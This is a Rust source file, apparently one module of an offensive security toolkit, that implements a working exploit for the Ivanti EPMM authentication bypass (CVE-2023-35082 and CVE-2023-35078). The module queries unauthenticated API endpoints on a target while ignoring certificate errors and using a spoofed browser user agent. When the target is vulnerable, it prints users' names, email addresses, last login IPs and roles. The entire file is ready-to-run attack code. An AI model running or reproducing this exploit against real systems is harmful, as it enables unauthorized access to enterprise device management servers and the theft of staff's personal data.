use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use serde_json::Value;
use crate::utils::{prompt_required, normalize_target};

/// Ivanti EPMM Authentication Bypass (CVE-2023-35082 & CVE-2023-35078)
/// 
/// Targets:
/// - /mifs/asfV3/api/v2/authorized/users (CVE-2023-35082)
/// - /mifs/aad/api/v2/authorized/users (CVE-2023-35078)
/// 
/// Dumps user information if vulnerable.

pub async fn run(target: &str) -> Result<()> {
    print_banner();

    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    // Default to HTTPS/443 if no scheme provided
    let base_url = if target_ip.contains("://") {
        target_ip
    } else {
        format!("https://{}", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    let paths = vec![
        ("mifs/asfV3", "CVE-2023-35082"),
        ("mifs/aad", "CVE-2023-35078"),
    ];
    
    let mut vulnerable = false;

    for (path, cve) in paths {
        let url = format!("{}/{}/api/v2/authorized/users?adminDeviceSpaceId=1", base_url, path);
        println!("{} Checking {} ({}) ...", "[*]".blue(), path, cve);
        
        match check_endpoint(&client, &url).await {
            Ok(Some(json)) => {
                println!("{} Vulnerable to {}!", "[+]".green(), cve);
                vulnerable = true;
                process_data(&json);
            },
            Ok(None) => {}, // Silent if not vulnerable on this path
            Err(e) => {
                println!("{} Error checking {}: {}", "[-]".red(), path, e);
            }
        }
    }
    
    if !vulnerable {
        println!("{} Target does not appear to be vulnerable to checked CVEs.", "[*]".yellow());
    }

    Ok(())
}

async fn check_endpoint(client: &Client, url: &str) -> Result<Option<Value>> {
    let res = client.get(url)
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36")
        .header("Accept", "application/json, text/plain, */*")
        .send()
        .await?;
        
    if res.status().is_success() {
        let text = res.text().await?;
        if let Ok(json) = serde_json::from_str::<Value>(&text) {
             // Check if it has "results" or "result"
             if json.get("results").is_some() || json.get("result").is_some() {
                 return Ok(Some(json));
             }
        }
    }
    Ok(None)
}

fn process_data(data: &Value) {
    let results = if let Some(r) = data.get("results") {
        r
    } else if let Some(r) = data.get("result") {
        r
    } else {
        return;
    };
    
    if let Some(arr) = results.as_array() {
        println!("{} Dumping first 5 users:", "[+]".green());
        for (i, user) in arr.iter().take(5).enumerate() {
            let email = user["email"].as_str().unwrap_or("N/A");
            let name = user["displayName"].as_str().unwrap_or("N/A");
            let ip = user["lastLoginIp"].as_str().unwrap_or("N/A");
            // roles is an array of strings
            let roles = user["roles"].as_array()
                .map(|r| r.iter().map(|s| s.as_str().unwrap_or("")).collect::<Vec<_>>().join(", "))
                .unwrap_or_default();
            
            println!("   [{}] Name: {}, Email: {}, IP: {}, Roles: {}", i+1, name, email, ip, roles);
        }
    }
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Ivanti EPMM Auth Bypass (CVE-2023-35082/35078)         ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
